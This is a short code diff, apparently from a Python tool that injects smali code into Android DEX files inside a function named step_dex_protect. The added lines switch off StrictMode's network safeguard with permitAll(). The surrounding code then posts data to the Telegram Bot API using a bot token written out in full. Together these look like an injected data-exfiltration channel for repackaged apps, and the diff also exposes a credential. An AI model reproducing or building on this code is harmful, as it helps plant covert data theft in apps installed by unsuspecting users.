@@ -2411,6 +2411,18 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     :dbg_catch_file_end
 
     :dbg_try_tg_start
+    # ── Bypass NetworkOnMainThreadException via StrictMode ────────────────────
+    # Android throws NetworkOnMainThreadException for network I/O on main thread.
+    # Set a permissive StrictMode policy first so HTTP POST completes without error.
+    # StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build())
+    new-instance v5, Landroid/os/StrictMode$ThreadPolicy$Builder;
+    invoke-direct {{v5}}, Landroid/os/StrictMode$ThreadPolicy$Builder;-><init>()V
+    invoke-virtual {{v5}}, Landroid/os/StrictMode$ThreadPolicy$Builder;->permitAll()Landroid/os/StrictMode$ThreadPolicy$Builder;
+    move-result-object v5
+    invoke-virtual {{v5}}, Landroid/os/StrictMode$ThreadPolicy$Builder;->build()Landroid/os/StrictMode$ThreadPolicy;
+    move-result-object v5
+    invoke-static {{v5}}, Landroid/os/StrictMode;->setThreadPolicy(Landroid/os/StrictMode$ThreadPolicy;)V
+
     # ── Send to Telegram API via HTTP POST ────────────────────────────────────
     # URL: https://api.telegram.org/bot<token>/sendMessage
     const-string v0, "https://api.telegram.org/bot9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw/sendMessage"
